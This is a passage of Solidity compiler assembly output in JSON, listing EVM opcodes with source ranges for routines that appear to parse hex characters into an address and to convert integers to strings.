											"name": "AND",
											"source": 0
										},
										{
											"begin": 8774,
											"end": 8783,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8774,
											"end": 8783,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "tag",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 8759,
											"end": 8784,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8811,
											"end": 8813,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 8805,
											"end": 8813,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8805,
											"end": 8813,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8805,
											"end": 8813,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8805,
											"end": 8813,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "82"
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "tag",
											"source": 0,
											"value": "81"
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8846,
											"end": 8848,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 8840,
											"end": 8842,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8840,
											"end": 8848,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8840,
											"end": 8848,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8840,
											"end": 8848,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8840,
											"end": 8848,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8860,
											"end": 8862,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 8854,
											"end": 8856,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8854,
											"end": 8862,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8854,
											"end": 8862,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8854,
											"end": 8862,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8854,
											"end": 8862,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "tag",
											"source": 0,
											"value": "83"
										},
										{
											"begin": 8839,
											"end": 8863,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8890,
											"end": 8892,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 8884,
											"end": 8892,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8884,
											"end": 8892,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8884,
											"end": 8892,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8884,
											"end": 8892,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "tag",
											"source": 0,
											"value": "84"
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8925,
											"end": 8927,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 8919,
											"end": 8921,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8919,
											"end": 8927,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8919,
											"end": 8927,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8919,
											"end": 8927,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 8919,
											"end": 8927,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8939,
											"end": 8941,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 8933,
											"end": 8935,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8933,
											"end": 8941,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 8933,
											"end": 8941,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 8933,
											"end": 8941,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 8933,
											"end": 8941,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "tag",
											"source": 0,
											"value": "86"
										},
										{
											"begin": 8918,
											"end": 8942,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8914,
											"end": 8987,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8914,
											"end": 8987,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 8914,
											"end": 8987,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 8969,
											"end": 8971,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 8963,
											"end": 8971,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 8963,
											"end": 8971,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 8963,
											"end": 8971,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 8963,
											"end": 8971,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8914,
											"end": 8987,
											"name": "tag",
											"source": 0,
											"value": "87"
										},
										{
											"begin": 8914,
											"end": 8987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "tag",
											"source": 0,
											"value": "85"
										},
										{
											"begin": 8835,
											"end": 8987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "tag",
											"source": 0,
											"value": "82"
										},
										{
											"begin": 8755,
											"end": 8987,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9012,
											"end": 9014,
											"name": "PUSH",
											"source": 0,
											"value": "61"
										},
										{
											"begin": 9006,
											"end": 9008,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9006,
											"end": 9014,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9006,
											"end": 9014,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9006,
											"end": 9014,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9006,
											"end": 9014,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9026,
											"end": 9029,
											"name": "PUSH",
											"source": 0,
											"value": "66"
										},
										{
											"begin": 9020,
											"end": 9022,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9020,
											"end": 9029,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9020,
											"end": 9029,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9020,
											"end": 9029,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9020,
											"end": 9029,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "tag",
											"source": 0,
											"value": "88"
										},
										{
											"begin": 9005,
											"end": 9030,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9057,
											"end": 9059,
											"name": "PUSH",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 9051,
											"end": 9059,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9051,
											"end": 9059,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9051,
											"end": 9059,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9051,
											"end": 9059,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "tag",
											"source": 0,
											"value": "89"
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9092,
											"end": 9094,
											"name": "PUSH",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 9086,
											"end": 9088,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9086,
											"end": 9094,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9086,
											"end": 9094,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9086,
											"end": 9094,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9086,
											"end": 9094,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9106,
											"end": 9108,
											"name": "PUSH",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 9100,
											"end": 9102,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9100,
											"end": 9108,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9100,
											"end": 9108,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9100,
											"end": 9108,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9100,
											"end": 9108,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "tag",
											"source": 0,
											"value": "91"
										},
										{
											"begin": 9085,
											"end": 9109,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9136,
											"end": 9138,
											"name": "PUSH",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 9130,
											"end": 9138,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9130,
											"end": 9138,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9130,
											"end": 9138,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9130,
											"end": 9138,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "tag",
											"source": 0,
											"value": "92"
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9171,
											"end": 9173,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9165,
											"end": 9167,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9165,
											"end": 9173,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9165,
											"end": 9173,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9165,
											"end": 9173,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 9165,
											"end": 9173,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9185,
											"end": 9187,
											"name": "PUSH",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 9179,
											"end": 9181,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9179,
											"end": 9187,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9179,
											"end": 9187,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9179,
											"end": 9187,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 9179,
											"end": 9187,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "tag",
											"source": 0,
											"value": "94"
										},
										{
											"begin": 9164,
											"end": 9188,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9233,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9233,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 9160,
											"end": 9233,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9215,
											"end": 9217,
											"name": "PUSH",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 9209,
											"end": 9217,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9209,
											"end": 9217,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9209,
											"end": 9217,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 9209,
											"end": 9217,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9160,
											"end": 9233,
											"name": "tag",
											"source": 0,
											"value": "95"
										},
										{
											"begin": 9160,
											"end": 9233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "tag",
											"source": 0,
											"value": "93"
										},
										{
											"begin": 9081,
											"end": 9233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "tag",
											"source": 0,
											"value": "90"
										},
										{
											"begin": 9001,
											"end": 9233,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9267,
											"end": 9269,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9262,
											"end": 9264,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9257,
											"end": 9259,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9264,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 9257,
											"end": 9269,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9247,
											"end": 9270,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 9247,
											"end": 9270,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 9247,
											"end": 9270,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 9247,
											"end": 9270,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8622,
											"end": 8623,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 8617,
											"end": 8623,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 8617,
											"end": 8623,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 8617,
											"end": 8623,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8617,
											"end": 8623,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "75"
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "tag",
											"source": 0,
											"value": "76"
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8584,
											"end": 9282,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9307,
											"end": 9312,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "SWAP5",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9292,
											"end": 9313,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8382,
											"end": 9321,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14925,
											"end": 15036,
											"name": "tag",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 14925,
											"end": 15036,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14974,
											"end": 14981,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15001,
											"end": 15028,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 15014,
											"end": 15027,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 15014,
											"end": 15025,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15014,
											"end": 15027,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15014,
											"end": 15027,
											"name": "tag",
											"source": 0,
											"value": "98"
										},
										{
											"begin": 15014,
											"end": 15027,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15001,
											"end": 15013,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 15001,
											"end": 15028,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15001,
											"end": 15028,
											"name": "tag",
											"source": 0,
											"value": "97"
										},
										{
											"begin": 15001,
											"end": 15028,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14994,
											"end": 15028,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14994,
											"end": 15028,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14925,
											"end": 15036,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14925,
											"end": 15036,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 16461,
											"end": 16575,
											"name": "tag",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 16461,
											"end": 16575,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16513,
											"end": 16520,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16540,
											"end": 16567,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 16553,
											"end": 16566,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "101"
										},
										{
											"begin": 16553,
											"end": 16564,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 16553,
											"end": 16566,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16553,
											"end": 16566,
											"name": "tag",
											"source": 0,
											"value": "101"
										},
										{
											"begin": 16553,
											"end": 16566,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16540,
											"end": 16552,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 16540,
											"end": 16567,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16540,
											"end": 16567,
											"name": "tag",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 16540,
											"end": 16567,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16533,
											"end": 16567,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16533,
											"end": 16567,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 16461,
											"end": 16575,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16461,
											"end": 16575,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 8116,
											"end": 8207,
											"name": "tag",
											"source": 0,
											"value": "56"
										},
										{
											"begin": 8116,
											"end": 8207,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 8167,
											"end": 8171,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 8191,
											"end": 8199,
											"name": "PUSH",
											"source": 0,
											"value": "4B716D2"
										},
										{
											"begin": 8184,
											"end": 8199,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8184,
											"end": 8199,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 8116,
											"end": 8207,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 8116,
											"end": 8207,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 9880,
											"end": 10318,
											"name": "tag",
											"source": 0,
											"value": "57"
										},
										{
											"begin": 9880,
											"end": 10318,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9935,
											"end": 9948,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 9963,
											"end": 9973,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9976,
											"end": 9977,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9963,
											"end": 9977,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9963,
											"end": 9977,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9988,
											"end": 9994,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9997,
											"end": 9998,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9988,
											"end": 9998,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9988,
											"end": 9998,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "tag",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10021,
											"end": 10022,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10016,
											"end": 10017,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10016,
											"end": 10022,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10039,
											"end": 10046,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10066,
											"end": 10068,
											"name": "PUSH",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "tag",
											"source": 0,
											"value": "106"
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10061,
											"end": 10068,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "104"
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "tag",
											"source": 0,
											"value": "105"
										},
										{
											"begin": 10009,
											"end": 10080,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10090,
											"end": 10106,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10119,
											"end": 10124,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "107"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "107"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 10109,
											"end": 10125,
											"name": "AND",
											"source": 0
										},
										{
